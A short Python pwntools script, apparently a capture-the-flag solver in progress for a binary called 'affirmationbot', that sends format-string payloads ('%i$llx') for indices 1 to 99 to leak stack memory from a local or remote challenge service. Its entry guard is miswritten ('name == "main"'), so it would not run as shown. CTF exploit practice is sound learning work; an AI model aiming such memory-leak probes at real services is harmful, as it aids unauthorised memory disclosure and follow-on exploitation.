#!/usr/bin/env python3

from pwn import *

elf = ELF("./affirmationbot")

gs = '''
continue
break main
'''

context.binary = elf

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("chal.wwctf.com", 4001)

io = conn()

def main():

    # good luck pwning 

    # gdb.attach(io, gdbscript=gs)

    for i in range(1, 100):
      payload = f"%{i}$llx".encode()
      io.sendlineafter(b">", payload)
      leak = io.recvline().strip()
      print(f"{i}: {leak}")

if name == "main":
    main()
